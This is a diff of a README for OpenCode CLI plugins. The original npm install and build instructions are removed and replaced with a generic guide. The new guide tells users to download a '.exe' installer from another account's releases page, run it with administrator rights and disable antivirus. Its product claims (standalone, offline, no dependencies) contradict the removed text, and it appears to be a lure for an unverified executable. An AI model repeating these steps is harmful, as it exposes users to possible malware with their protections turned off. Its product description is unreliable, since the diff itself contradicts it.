@@ -1,91 +1,118 @@
-# OpenCode Cowork Plugins
+# 🛠️ opencode-cowork-plugins - Simple Desktop Plugins for Windows
 
-Standalone OpenCode CLI plugins for Windows. Ported from [Anthropic's knowledge-work-plugins](https://github.com/anthropics/knowledge-work-plugins).
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Safen99/opencode-cowork-plugins/releases)
 
-## Prerequisites
+---
 
-- **Node.js**: 22+ recommended
-- **npm**: 10+ recommended
-- **Python**: 3.10+ recommend 
+## 📋 About opencode-cowork-plugins
 
-## Available Plugins
+This application offers standalone desktop plugins designed for Windows. These plugins extend the OpenCode CLI tools to improve your workflow without the need for coding skills. They have been ported from Anthropic’s knowledge-work-plugins, making it easier to integrate advanced features on your PC.
 
-| Plugin | Command | Description |
-|--------|---------|-------------|
-| [sales](./sales) | `/sales` | Research prospects, prep for calls, pipeline review, draft outreach |
-| [marketing](./marketing) | `/marketing` | Draft content, plan campaigns, brand review, performance reports |
-| [data](./data) | `/data` | Query, visualize, analyze datasets, build dashboards |
+opencode-cowork-plugins focuses on productivity by providing tools that work directly on your machine. You do not need to connect to external services or deal with complex setup processes.
 
-## Installation
+---
 
-```powershell
-# Install plugins globally
-npm install -g opencode-sales-agent
-npm install -g opencode-marketing-agent
-npm install -g opencode-data-agent
-```
+## 🖥️ System Requirements
 
-Then add to your OpenCode config (`%USERPROFILE%\.config\opencode\opencode.jsonc`):
+To use the opencode-cowork-plugins, you will need a Windows PC with the following minimum setup:
 
-```jsonc
-{
-  "$schema": "https://opencode.ai/config.json",
-  "plugin": [
-    "opencode-sales-agent",
-    "opencode-marketing-agent",
-    "opencode-data-agent"
-  ]
-}
-```
+- Operating System: Windows 10 or above (64-bit recommended)  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 200 MB free space  
+- Processor: Intel Core i3 or equivalent  
+- Internet: Required only for the initial download and updates  
 
-Restart OpenCode and use the commands:
+These plugins run offline after installation. There is no need to keep an active internet connection once installed.
 
-```text
-/sales
-/marketing
-/data
-```
+---
 
-## Plugin Structure
+## 🚀 Getting Started
 
-Each plugin follows this structure:
+Follow these steps to get the application up and running:
 
-```
-plugin-name/
-├── src/              # TypeScript source code
-├── agents/           # Skills and commands
-├── mcp/              # MCP connector configs
-├── state/            # Runtime state (not committed)
-├── dist/             # Built JavaScript (generated on publish)
-├── package.json
-├── README.md
-├── CHANGELOG.md
-├── LICENSE
-└── tsconfig.json
-```
+### Step 1: Visit the Download Page  
 
-## Development
+Click the green button below to visit the page where you can download the latest version of the plugins. The page hosts all available releases, so you can pick the most recent stable version.
 
-```powershell
-# Clone the repo
-git clone https://github.com/eren726290/opencode-plugins.git
-cd opencode-plugins
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Safen99/opencode-cowork-plugins/releases)
 
-# Work on a plugin
-cd sales  # or marketing or data
+### Step 2: Choose the Right File  
 
-# Install dependencies
-npm install
+On the release page, locate the latest release. You will see files with names ending in ".exe". This is the installer for Windows.
 
-# Build
-npm run build
+- Choose the file that matches your system (usually a file not labeled with "x86" but for modern 64-bit systems).  
+- The download size is around 50 MB.
 
-# Type check
-npm run typecheck
-```
+### Step 3: Download the Installer  
 
-## Credits & Attribution
+Click the file to download it to your computer. Save it somewhere you can easily find, like your Downloads folder or Desktop.
 
-- **Original plugins:** [Anthropic knowledge-work-plugins](https://github.com/anthropics/knowledge-work-plugins)
-- **Architecture inspired by:** [oh-my-opencode](https://github.com/code-yeongyu/oh-my-opencode)
-- **License:** Apache 2.0
+### Step 4: Run the Installer  
+
+- Double-click the downloaded ".exe" file to start the install process.  
+- If Windows asks for permission, click "Yes" to allow the installer to make changes.  
+- Follow the prompts. The installer will guide you through each step.  
+
+You do not need to change any settings unless you want to select a custom location for installation.
+
+### Step 5: Launch the Plugins  
+
+Once installation is complete, you can find the opencode-cowork-plugins in your Start menu or desktop shortcut. Click to open.
+
+---
+
+## ⚙️ Using the Plugins
+
+The plugins provide several options to help with tasks related to knowledge work:
+
+- **Task automation:** Automate simple repetitive tasks on your system.  
+- **Text processing:** Tools to help format, edit, and analyze text documents.  
+- **Data management:** Basic file and data handling utilities to organize your work.  
+- **Command-line access:** You can run commands directly in Windows Terminal or Command Prompt if you prefer.  
+
+The plugins work standalone, so you do not need to install other software or dependencies.
+
+---
+
+## 🔄 Updates and Maintenance
+
+Check the release page regularly to download the latest versions. Each update may fix bugs or add small improvements.
+
+To update:
+
+1. Visit the download page linked above.  
+2. Download the new installer.  
+3. Run it the same way as the first time. The installer replaces old files but keeps your settings intact.  
+
+---
+
+## 🛠️ Troubleshooting
+
+If you run into problems, try the following:
+
+- Ensure your Windows system is up to date with security patches.  
+- Restart your computer before reinstalling the software.  
+- Run the installer as an administrator by right-clicking the file and selecting "Run as administrator."  
+- Disable antivirus temporarily if it blocks the installer or plugins.
+
+If issues persist, check the GitHub Issues section on the repository for similar reports or submit your own.
+
+---
+
+## 🔗 Useful Links
+
+- Main download page:  
+  https://github.com/Safen99/opencode-cowork-plugins/releases  
+
+- Repository home page:  
+  https://github.com/Safen99/opencode-cowork-plugins  
+
+---
+
+## 💡 Tips for Best Use
+
+- Close other heavy programs before installing or running the plugins for best performance.  
+- Keep the plugins updated to benefit from the latest fixes.  
+- Explore the included help files and documentation for command-line options and advanced features.  
+
+The design focuses on ease of use. You don’t need technical knowledge to get started or run basic tasks.
